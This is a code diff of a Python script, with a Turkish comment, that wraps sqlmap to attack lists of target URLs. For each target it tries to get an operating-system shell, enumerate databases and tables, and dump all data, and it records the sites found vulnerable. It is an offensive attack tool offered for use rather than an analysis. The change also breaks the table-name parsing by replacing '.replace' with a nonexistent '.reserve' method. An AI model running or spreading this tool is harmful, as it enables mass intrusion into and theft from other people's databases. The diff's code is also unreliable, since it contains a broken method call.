@@ -2,8 +2,12 @@ import subprocess
 from urllib.parse import urlparse
 import re
 import os
-import config.setting as setting
+import json
 from settings import TARGET_FILE_PATH, TARGET, TARGET_FILE_CHECK # type: ignore
+
+# setting.json dosyasını oku
+with open(os.path.join(os.path.dirname(__file__), 'config', 'setting.json'), 'r', encoding='utf-8') as f:
+    setting = json.load(f)
 
 tables_pattern = r"available databases\s*\[(\d+)\]"
 
@@ -29,7 +33,7 @@ def save_vulnerable_url(url):
         f.write(f"{url}\n")
 
 def get_urls():
-    if TARGET_FILE_CHECK.lower() == "on":
+    if setting.get('TARGET_FILE_CHECK', 'off').lower() == "on":
         try:
             with open(TARGET_FILE_PATH, "r") as f:
                 urls = [url.strip() for url in f.readlines()]
@@ -37,14 +41,19 @@ def get_urls():
             log_result("N/A", "ERROR", f"Failed to read TARGET_FILE_PATH: {str(e)}")
             return []
     else:
-        urls = [TARGET.strip()]
+        target = setting.get('TARGET', '').strip()
+        urls = [target] if target else []
     return urls
 
 def os_shell():
     urls = get_urls()
     for url in urls:
         try:
-            result = subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "--os-shell", "--output-dir=sql"], capture_output=True, text=True)
+            result = subprocess.run(
+                ["sqlmap", "-u", url, "-v3", "--batch", f"--threads={setting.get('sqlmap_threads', 10)}", "--os-shell", "--output-dir=sql"],
+                capture_output=True,
+                text=True
+            )
             if "os-shell" in result.stdout.lower():
                 save_vulnerable_url(url)
                 log_result(url, "VULNERABLE", "OS Shell detected")
@@ -57,7 +66,11 @@ def dbs():
     urls = get_urls()
     for url in urls:
         try:
-            result = subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "--dbs", "--output-dir=sql"], capture_output=True, text=True)
+            result = subprocess.run(
+                ["sqlmap", "-u", url, "-v3", "--batch", f"--threads={setting.get('sqlmap_threads', 10)}", "--dbs", "--output-dir=sql"],
+                capture_output=True,
+                text=True
+            )
             if "available databases" in result.stdout.lower():
                 save_vulnerable_url(url)
                 log_result(url, "VULNERABLE", "Databases detected")
@@ -77,8 +90,12 @@ def tables(url):
             for line in lines:
                 match = re.search(tables_pattern, line)
                 if isTable:
-                    table = line.strip().replace("[*] ", "")
-                    result = subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "-D", table, "--tables", "--output-dir=sql"], capture_output=True, text=True)
+                    table = line.strip().reserve("[*] ", "")
+                    result = subprocess.run(
+                        ["sqlmap", "-u", url, "-v3", "--batch", f"--threads={setting.get('sqlmap_threads', 10)}", "-D", table, "--tables", "--output-dir=sql"],
+                        capture_output=True,
+                        text=True
+                    )
                     log_result(url, "TABLE SCAN", f"Scanned tables for database: {table}")
                 if match:
                     isTable = True
@@ -89,7 +106,11 @@ def dumpall():
     urls = get_urls()
     for url in urls:
         try:
-            result = subprocess.run(["sqlmap", "-u", url, "-v3", "--dump-all", "--batch", "--threads=10", "--output-dir=sql"], capture_output=True, text=True)
+            result = subprocess.run(
+                ["sqlmap", "-u", url, "-v3", "--dump-all", "--batch", f"--threads={setting.get('sqlmap_threads', 10)}", "--output-dir=sql"],
+                capture_output=True,
+                text=True
+            )
             if "dumping" in result.stdout.lower():
                 save_vulnerable_url(url)
                 log_result(url, "VULNERABLE", "Data dump successful")
@@ -97,3 +118,4 @@ def dumpall():
                 log_result(url, "NOT VULNERABLE", "No data dumped")
         except Exception as e:
             log_result(url, "ERROR", str(e))
+        
